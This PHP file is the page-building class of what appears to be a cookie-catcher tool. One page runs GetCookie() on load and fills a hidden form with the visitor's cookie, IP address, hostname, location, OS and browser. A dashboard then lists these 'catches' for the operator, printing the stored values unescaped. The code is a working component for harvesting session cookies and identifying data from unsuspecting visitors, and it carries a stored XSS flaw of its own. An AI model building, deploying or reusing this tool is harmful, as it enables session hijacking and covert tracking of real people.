<?php
class HTMLBuilder {
    public static function GetImportable($Type = null, $LandingPage = null) {
        $Type = (($Type !== null) && (strtolower($Type) === "css" || strtolower($Type) === "js" || strtolower($Type) === "both")) ? strtolower($Type) : null;

        if($Type !== null && ($LandingPage !== null && in_array(strtolower($LandingPage), ["index", "dashboard"]))) {
            switch(strtolower($Type)) {
                case "css":
                    return "<link rel=\"stylesheet\" type=\"text/css\" href=\"Css/" . ucfirst(strtolower($LandingPage)) . "." . $Type . "\" />";
                    break;
                case "js":
                    return "<script src=\"JavaScript/" . ucfirst(strtolower($LandingPage)) . "." . $Type . "\"></script>";
                    break;
                case "both":
                    return "
                        <link rel=\"stylesheet\" type=\"text/css\" href=\"Css/" . ucfirst(strtolower($LandingPage)) . ".css\" />
                        <script src=\"JavaScript/" . ucfirst(strtolower($LandingPage)) . ".js\"></script>
                    ";
                    break;

                default:
                    return "";
                    break;
            }
        }
        
        return "";
    }

    public static function CatchHead() {
        echo "
        <!DOCTYPE html>
        <html lang=\"en\">
        <head>
            <title></title>
        	<script src=\"JavaScript/Generic.js\"></script>
        </head>
        <body onload=\"GetCookie();\">
        ";
    }

    public static function DashboardHead(string $LandingPage = null) {
        echo "
            <!DOCTYPE html>
            <html lang=\"" . escape(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2)) . "\">
            <head>
                <title>" . escape(Config::Get("AppData/Name")) . "</title>
                <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
                <script type=\"text/javascript\" src=\"" . Config::Get("AssetURLs/JQuery") . "\"></script>
                <link rel=\"stylesheet\" href=\"" . Config::Get("AssetURLs/FontAwesome") . "\" />
                <link rel=\"stylesheet\" type=\"text/css\" href=\"Css/Generic.css\" />
                <script src=\"JavaScript/Generic.js\"></script>
                " . (($LandingPage !== null) ? self::GetImportable("both", $LandingPage) : "") . "
            </head>
            <body>
                " . self::DashboardHeader() . "
                <div class=\"content\" id=\"content\">
        ";       
    }

    private static function DashboardHeader(bool $WithSearch = false) {
        if(!$WithSearch) {
            echo "
                <div class=\"header\" id=\"header\">
                    <a href=\"dashboard.php\" class=\"logo\" id=\"logo\">" . escape(Config::Get("AppData/Name")) . "</a>
                </div>
            ";
        } else {
            echo "
                <div class=\"header\" id=\"header\">
                    <a href=\"dashboard.php\" class=\"logo\" id=\"logo\">" . escape(Config::Get("AppData/Name")) . "</a>

                    <form class=\"search-form\" id=\"search-form\">
                        <select class=\"toggle-search\" id=\"toggle-search\">
                            <option value=\"ip_address\">IP Address</option>
                            <option value=\"local_hostname\">Local Hostname</option>
                            <option value=\"hostname\">Hostname</option>
                            <option value=\"location\">Location</option>
                        </select>
                    </form>
                </div>
            ";
        }
    }

    public static function DashboardContainers() {
        $Catches = (new Database())::Select("catches", array(["id", "!=", ""]), null, ["order_by" => "catch_date", "order" => "DESC"]);

        if($Catches !== null && !empty($Catches)) {
            foreach($Catches as $Catch) {
                echo "
                    <div class=\"catch-row-container\" id=\"catch-row-container\">
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-id\">Catch ID: <span class=\"row-data-span\">" . $Catch["id"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-date\">Catch Date: <span class=\"row-data-span\">" . $Catch["catch_date"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-cookie\">Cookie: <span class=\"row-data-span\">" . $Catch["cookie"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-decoded\">Decoded Cookie: <span class=\"row-data-span\">" . $Catch["decoded_cookie"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-ip\">IP Address: <span class=\"row-data-span\">" . $Catch["ip_address"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-location\">Location: <span class=\"row-data-span\">" . $Catch["location"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-local\">Local Hostname: <span class=\"row-data-span\">" . $Catch["local_hostname"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-hostname\">Hostname: <span class=\"row-data-span\">" . $Catch["hostname"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-os\">Client OS: <span class=\"row-data-span\">" . $Catch["client_os"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-browser\">Client Browser: <span class=\"row-data-span\">" . $Catch["client_browser"] . "</span></p>
                        <p class=\"catch-display-row-data\" id=\"catch-display-row-data-useragent\">User Agent: <span class=\"row-data-span\">" . $Catch["user_agent"] . "</span></p>
                    </div>
                </div>
                ";
            }
        }
    }

    public static function CatchForm(string $IPAddress = null, array $Location = array(), string $UserAgent = null) {    
        echo "
            <form id=\"catch-form\" class=\"catch-form\" method=\"post\" action=\"\">
	        	<input type=\"text\" name=\"cookie-value\" id=\"cookie-value\" hidden />
        		<input type=\"text\" name=\"decoded-cookie\" id=\"decoded-cookie\" hidden />

        		<input type=\"text\" name=\"ip-address\" id=\"ip-address\" value=\"" . (($IPAddress !== null) ? $IPAddress : "Unknown IP Address") . "\" hidden />
		        <input type=\"text\" name=\"user-agent\" id=\"user-agent\" value=\"" . (($UserAgent !== null) ? $UserAgent : "Unknown User Agent") . "\" hidden />
        		<input type=\"text\" name=\"local-hostname\" id=\"local-hostname\" value=\"" . ((gethostname() !== false) ? gethostname() : "Unknown Local Hostname") . "\" hidden />
        		<input type=\"text\" name=\"hostname\" id=\"hostname\" value=\"" . (($IPAddress !== null && gethostbyaddr($IPAddress) !== false) ? gethostbyaddr($IPAddress) : "Unknown Host Name") . "\" hidden />
		        <input type=\"text\" name=\"location\" id=\"location\" value=\"" . (($Location !== null && array_key_exists("full_location", $Location)) ? $Location["full_location"] : "Unknown Location") . "\" hidden />
        		<input type=\"text\" name=\"client-os\" id=\"client-os\" value=\"" . (($UserAgent !== null && Client::GetOS($UserAgent) !== null) ? Client::GetOS($UserAgent) : "Unknown OS") . "\" hidden />
	        	<input type=\"text\" name=\"client-browser\" id=\"client-browser\" value=\"" . (($UserAgent !== null && Client::GetBrowser($UserAgent) !== null) ? Client::GetBrowser($UserAgent) : "Unknown Browser") . "\" hidden />
    	    </form>

        	<button form=\"catch-form\" name=\"submit\" id=\"submit\" style=\"display:none;\"></button>
        </body>
        </html>
        ";
    }

    public static function GetFooter() {
        echo "
                <div class=\"footer\" id=\"footer\">
        	        <h6 class=\"footer-text\" id=\"footer-text\">" . escape(Config::Get("AppData/Name")) . " " . escape(Config::Get("AppData/Version")) . "</h6>
                </div>
            </body>
            </html>
        ";
    }
}
?>
